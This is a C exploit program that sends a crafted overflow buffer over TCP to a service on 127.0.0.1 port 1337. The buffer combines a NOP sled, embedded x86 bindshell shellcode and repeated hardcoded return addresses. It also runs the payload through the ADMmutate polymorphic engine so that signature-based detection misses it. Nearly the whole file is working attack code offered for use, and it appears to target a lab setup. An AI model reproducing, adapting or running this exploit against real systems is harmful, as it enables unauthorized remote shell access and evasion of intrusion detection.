#include <stdlib.h>
#include <fcntl.h>
#include <stdio.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>

#include "ADMmutapi.h"

char sc[] = // bindshell by Ramon de Carvalho Valle
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\xff\x49\x02\x6a\x10"
"\x51\x50\x89\xe1\x43\xb0\x66\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66"
"\xcd\x80\x59\x93\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

#define NOP 0x90
#define RET_ADDR 0xbfffe89c
#define BUFF_SIZE 1050

int main(int argc, char **argv)
{
  ulong *addr_p;
  char *buff;
  int i,sfd;
  struct sockaddr_in dest;

  struct morphctl *mctlp;
  struct morphctl mut;
  mut.upper = 0; mut.lower = 0; mut.banned = NULL; mctlp = &mut;
  mut.arch = IA32;

  dest.sin_family = AF_INET;
  dest.sin_port = htons(1337);
  dest.sin_addr.s_addr = inet_addr("127.0.0.1");
  memset(&dest.sin_zero,0,8);

  buff = malloc(BUFF_SIZE);
  int nops = 300 + (BUFF_SIZE % 4);	// that should be enough, does padding by buffer size

  memset(buff,NOP,nops);		// pad with NOPs
  memcpy(buff+nops,sc,strlen(sc));	// inject shellcode
  addr_p = (ulong *)&buff[nops+strlen(sc)];
  for ( i = (strlen(sc)+nops-1); i<BUFF_SIZE; i+=4)
    *(addr_p++) = RET_ADDR;    		// add return addresses 

  // Now polymorphise the whole deal, here we use ADMmutate's nop-sled - apply_jnops()
  init_mutate(mctlp);
  apply_key(buff, strlen(sc), nops-1, mctlp);
  apply_jnops(buff, nops-1, mut);
  apply_engine(buff, strlen(sc), nops-1, mut);

  printf("Shellcode size: %d bytes\nBuffer size: %d bytes\nUsing return address: %p\n",strlen(sc),\
	 BUFF_SIZE,RET_ADDR);

  if((sfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
    perror("socket");
    exit(0);
  }
  if(connect(sfd, (struct sockaddr *)&dest, sizeof(dest)) < 0){
    perror("connect");
    exit(0);
  }
  write(sfd,buff,BUFF_SIZE);
  close(sfd);
  return 0;
}

